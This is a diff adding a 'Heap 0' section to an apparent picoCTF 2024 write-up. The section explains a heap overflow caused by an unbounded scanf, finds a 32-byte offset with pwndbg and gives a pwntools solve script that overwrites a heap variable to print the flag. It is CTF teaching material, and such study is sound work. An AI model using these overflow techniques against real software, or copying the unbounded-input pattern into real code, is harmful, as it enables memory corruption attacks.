@@ -2008,15 +2008,169 @@ Doing that I got the flag
 Flag: picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_63191ce6}
 ```
 
+#### Heap 0
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/858a4736-83c2-4405-9935-5aa26fd46394)
+
+Same as before we are given the binary and the source code then a remote instance to connect to 
+
+After downloading the attached file I ran the binary to get an overview of what it does
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a3ddc63b-476f-464c-9339-97907acba78f)
+
+Basically we are given the heap current state and our goal is to overwrite the value stored in `0x55e878c0d6b0`......the current value is "bico"
+
+We have 5 menu options
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c0381e07-212f-44ba-bdeb-82b776b66974)
+
+Each option does what it exactly says
+
+Now time to look for the vulnerability
+
+I will only show the one's i find important if you want to take a look at the full source code you can check it [here](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/picoctf/scripts/2024/Binary%20Exploitation/Heap%200/source.c)
 
 
+First the `init` function:
+
+```c
+#define FLAGSIZE_MAX 64
+#define INPUT_DATA_SIZE 5
+#define SAFE_VAR_SIZE 5
+
+int num_allocs;
+char *safe_var;
+char *input_data;
+
+void init() {
+    printf("\nWelcome to heap0!\n");
+    printf(
+        "I put my data on the heap so it should be safe from any tampering.\n");
+    printf("Since my data isn't on the stack I'll even let you write whatever "
+           "info you want to the heap, I already took care of using malloc for "
+           "you.\n\n");
+    fflush(stdout);
+    input_data = malloc(24);
+    strncpy(input_data, "pico", INPUT_DATA_SIZE);
+    safe_var = malloc(SAFE_VAR_SIZE);
+    strncpy(safe_var, "bico", SAFE_VAR_SIZE);
+}
+```
+
+This function would allocate memory of size 24 on the heap and then move "pico" into `input_data`
+
+Then it also allocates memory of size 5 on the heap and then moves "bico" into `safe_var`
+
+Note that both `input_data & safe_var` are the heap memory address 
+
+Next function:
+
+```c
+void write_buffer() {
+    printf("Data for buffer: ");
+    fflush(stdout);
+    scanf("%s", input_data);
+}
+```
+
+This would allow us write any amount of bytes to the `input_data` heap chunk since `scanf` was used without specifying the number of bytes to read in causing a heap overflow since our input is on the "heap"
+
+And finally this function:
+
+```c
+void check_win() {
+    if (strcmp(safe_var, "bico") != 0) {
+        printf("\nYOU WIN\n");
+
+        // Print flag
+        char buf[FLAGSIZE_MAX];
+        FILE *fd = fopen("flag.txt", "r");
+        fgets(buf, FLAGSIZE_MAX, fd);
+        printf("%s\n", buf);
+        fflush(stdout);
+
+        exit(0);
+    } else {
+        printf("Looks like everything is still secure!\n");
+        printf("\nNo flage for you :(\n");
+        fflush(stdout);
+    }
+}
+```
+
+It checks if `safe_var` isn't `bico` and if it isn't we get the flag
+
+Looking at this we can tell the goal is to overwrite the value of `bico` to anything we want
+
+To do that we need to get the offset between our input and the `safe_var` on the heap
+
+I used pwndbg for this
+
+After running the binary in pwndbg I just `CTRL+C` and looked at the heap chunks
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f2b70153-3b36-4c86-8a75-c53d4982706a)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/bffbc50e-688c-4f2a-830d-8029a7e6602f)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f0752f0b-4802-4c50-988b-223078db5db2)
+
+We see that our input is at `0x5555555596b0` and the address of the value where we want to overwrite is `0x5555555596d0` 
+
+Just take the difference and that gives the offset (32)
+
+Now we can just overwrite the value there
+
+Here's my solve [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/picoctf/scripts/2024/Binary%20Exploitation/Heap%200/solve.py)
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+from warnings import filterwarnings
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF('chall')
+
+filterwarnings("ignore")
+context.log_level = 'info'
+
+def start(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+gdbscript = '''
+init-pwndbg
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+def init():
+    global io
+
+    io = start()
 
 
+def write(data):
+    io.sendline("2")
+    io.sendafter("buffer:", data)
 
 
+def solve():
+    write(b'A'*0x20 + b'A'*4)
+    io.sendline('4')
+    io.sendline('4')
 
+    io.interactive()
 
+def main():
+    
+    init()
+    solve()
 
+if __name__ == '__main__':
+    main()
+```
 
 
 
